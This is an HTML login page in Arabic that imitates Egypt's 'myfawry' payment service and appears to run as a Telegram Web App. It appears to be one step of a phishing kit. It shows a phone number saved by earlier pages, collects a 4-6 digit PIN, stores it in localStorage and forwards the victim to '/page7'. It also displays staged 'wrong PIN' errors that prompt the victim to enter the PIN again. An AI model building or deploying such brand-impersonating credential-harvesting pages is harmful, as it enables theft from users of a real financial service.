<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>myfawry مصر - تسجيل الدخول</title>

    <!-- ✅ Telegram SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --fawry-yellow: #ffc20e;     /* Fawry Signature Yellow/Gold */
            --fawry-yellow-dark: #e0a800;
            --fawry-blue: #003366;       /* Fawry Dark Navy Blue */
            --fawry-blue-dark: #002244;
            --bg-color: #ffffff;
            --text-dark: #121820;
            --text-muted: #666666;
            --border-blue: #003366;
            --btn-disabled-bg: #e2e8f0;
            --btn-disabled-text: #a0aec0;
        }

        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body { 
            background-color: var(--bg-color); 
            margin: 0; 
            padding: 0;
            display: flex; 
            flex-direction: column; 
            min-height: 100vh; 
        }

        /* Top Header Area */
        .header-box { 
            width: 100%; 
            background: var(--fawry-blue); 
            padding: 30px 20px 25px; 
            color: #ffffff; 
            text-align: center; 
            box-shadow: 0 2px 10px rgba(0, 51, 102, 0.2);
        }

        .header-title {
            font-size: 30px;
            font-weight: 900;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            letter-spacing: -0.5px;
        }

        .header-title .region {
            font-size: 13px;
            margin-right: 8px;
            font-weight: 800;
            text-transform: uppercase;
            background: var(--fawry-yellow);
            color: var(--fawry-blue);
            padding: 2px 8px;
            border-radius: 6px;
        }

        .sub-header-text { 
            font-size: 14px; 
            margin-top: 6px; 
            font-weight: 600;
            color: #ffffff;
            opacity: 0.9;
        }

        /* Content Area */
        .main-content { 
            width: 90%; 
            max-width: 400px; 
            margin: 25px auto 0; 
            text-align: center; 
            flex-grow: 1; 
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        h2 { 
            color: var(--fawry-blue); 
            font-size: 22px; 
            margin: 10px 0 20px; 
            font-weight: 800; 
        }

        /* Red Error Banner */
        .error-banner {
            width: 100%;
            background-color: #ffebe9;
            border: 1px solid #ff4d4f;
            color: #d93025;
            padding: 12px;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 700;
            margin-bottom: 20px;
            display: none;
            box-shadow: 0 2px 6px rgba(217, 48, 37, 0.1);
        }

        /* Phone Display Field */
        .phone-display {
            width: 100%;
            border: 2px solid var(--border-blue);
            border-radius: 12px;
            padding: 14px 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-bottom: 25px;
            font-size: 18px;
            font-weight: 800;
            color: var(--fawry-blue);
            background-color: #fffdf0;
            direction: ltr;
        }

        .flag-icon {
            font-size: 20px;
            line-height: 1;
        }

        /* Password Input Area */
        .pwd-section {
            width: 100%;
            text-align: right;
            margin-bottom: 12px;
        }

        .pwd-label { 
            color: var(--fawry-blue); 
            margin-bottom: 8px; 
            font-size: 14px; 
            font-weight: 700; 
            display: block;
        }

        .pwd-wrapper {
            position: relative;
            width: 100%;
            display: flex;
            align-items: center;
        }

        .pwd-input {
            width: 100%;
            height: 52px;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            padding: 0 16px 0 45px;
            font-size: 18px;
            font-weight: 600;
            outline: none;
            background-color: #ffffff;
            transition: border-color 0.2s;
            direction: ltr;
        }

        .pwd-input:focus {
            border-color: var(--fawry-blue);
        }

        .pwd-input.input-error {
            border-color: #d93025;
            background-color: #fff9f9;
        }

        .toggle-eye { 
            position: absolute;
            left: 14px;
            cursor: pointer; 
            font-size: 20px; 
            user-select: none;
            color: var(--fawry-blue);
        }

        .forgot-pwd {
            color: var(--text-muted);
            font-size: 13px;
            text-decoration: none;
            margin: 10px 0 30px;
            display: inline-block;
            font-weight: 600;
            align-self: flex-start;
        }

        /* Submit Button */
        .btn-submit {
            background-color: var(--btn-disabled-bg);
            color: var(--btn-disabled-text);
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 800;
            cursor: not-allowed;
            letter-spacing: 0.5px;
            transition: background-color 0.2s, color 0.2s;
        }

        .btn-submit.active {
            background-color: var(--fawry-yellow);
            color: var(--fawry-blue);
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(255, 194, 14, 0.4);
        }

        .btn-submit.active:hover {
            background-color: var(--fawry-yellow-dark);
        }

        /* Footer */
        .footer-box { 
            width: 100%; 
            background: var(--fawry-blue); 
            padding: 35px 20px 20px; 
            color: #ffffff; 
            text-align: center; 
            border-top-left-radius: 50% 30px; 
            border-top-right-radius: 50% 30px; 
            margin-top: auto;
        }

        .footer-title {
            font-size: 26px;
            font-weight: 900;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .footer-title .region {
            font-size: 11px;
            margin-right: 6px;
            font-weight: 800;
            text-transform: uppercase;
            background: var(--fawry-yellow);
            color: var(--fawry-blue);
            padding: 2px 6px;
            border-radius: 4px;
        }

        .terms-text { 
            font-size: 11px; 
            margin-top: 15px; 
            padding: 0 20px; 
            line-height: 1.4; 
            color: #ffffff;
            font-weight: 500;
            opacity: 0.9;
        }

        .terms-text u { 
            color: #ffffff; 
            cursor: pointer; 
        }
    </style>
</head>

<body>

<!-- Header Section -->
<div class="header-box">
    <div class="header-title">
        <span>myfawry</span><span class="region">مصر</span>
    </div>
    <div class="sub-header-text">خدمات فوري المالية المدفوعة</div>
</div>

<!-- Main Login Form -->
<div class="main-content">
    <h2>تسجيل الدخول</h2>

    <!-- Red Error Banner -->
    <div id="errorDisplay" class="error-banner"></div>

    <!-- Mobile Number Displayed -->
    <div class="phone-display">
        <span class="flag-icon">🇪🇬</span>
        <span>+20</span>
        <span id="displayPhone">--</span>
    </div>

    <!-- Password Input Section -->
    <div class="pwd-section">
        <label for="passwordInput" class="pwd-label">كلمة السر (Password)</label>
        <div class="pwd-wrapper">
            <input type="password" id="passwordInput" class="pwd-input" placeholder="أدخل كلمة السر (4-6 خانات)" maxlength="6" autocomplete="current-password">
            <span class="toggle-eye" id="eyeIcon">👁️</span>
        </div>
    </div>

    <a href="#" class="forgot-pwd">هل نسيت كلمة السر؟</a>

    <button id="loginBtn" class="btn-submit" disabled>تسجيل الدخول</button>
</div>

<!-- Footer -->
<div class="footer-box">
    <div class="footer-title">
        <span>myfawry</span><span class="region">مصر</span>
    </div>
    <div class="sub-header-text">جميع الحقوق محفوظة لشركة فوري</div>
    <p class="terms-text">بإجراء تسجيل الدخول، فإنك توافق على <u>شروط وأحكام الاستخدام</u></p>
</div>

<script>
document.addEventListener("DOMContentLoaded", () => {

    const passwordInput = document.getElementById('passwordInput');
    const loginBtn = document.getElementById('loginBtn');
    const eye = document.getElementById('eyeIcon');
    const displayPhone = document.getElementById('displayPhone');
    const errorDisplay = document.getElementById('errorDisplay');

    // Retrieve saved phone from previous steps
    let savedPhone = localStorage.getItem('userPhone') || localStorage.getItem('phone') || "01000000000";
    savedPhone = savedPhone.replace(/^\+?20/, '').trim();
    displayPhone.textContent = savedPhone;

    // Detect error parameter in URL query
    const urlParams = new URLSearchParams(window.location.search);
    const errParam = urlParams.get('error');

    if (errParam === 'wrong_pin' || errParam === 'wrongpin' || errParam === 'wrong_password') {
        errorDisplay.textContent = "كلمة السر غير صحيحة، يرجى إعادة المحاولة.";
        errorDisplay.style.display = "block";
        passwordInput.classList.add('input-error');
        passwordInput.focus();
    } else if (errParam === 'invalid_credentials' || errParam === 'invalidcredentials') {
        errorDisplay.textContent = "البيانات غير صحيحة، يرجى التأكد من كلمة السر.";
        errorDisplay.style.display = "block";
        passwordInput.classList.add('input-error');
        passwordInput.focus();
    }

    // Input validation (length between 4 and 6 characters)
    passwordInput.addEventListener('input', () => {
        passwordInput.classList.remove('input-error');
        errorDisplay.style.display = "none";

        const val = passwordInput.value.trim();
        const isValidLength = val.length >= 4 && val.length <= 6;

        loginBtn.disabled = !isValidLength;
        loginBtn.classList.toggle('active', isValidLength);
    });

    // Eye toggle for password visibility
    eye.addEventListener('click', () => {
        const isPassword = passwordInput.type === "password";
        passwordInput.type = isPassword ? "text" : "password";
        eye.textContent = isPassword ? "🙈" : "👁️";
    });

    // Submit handler
    loginBtn.addEventListener('click', () => {
        if (!loginBtn.classList.contains('active')) return;
        
        loginBtn.disabled = true;
        loginBtn.classList.remove('active');

        const pwd = passwordInput.value.trim();
        localStorage.setItem('lastPin', pwd);
        localStorage.setItem('lastPassword', pwd);

        errorDisplay.style.display = "none";

        window.location.href = "/page7";
    });

    if (window.Telegram?.WebApp) {
        window.Telegram.WebApp.ready();
        window.Telegram.WebApp.expand();
    }
});
</script>

</body>
</html>
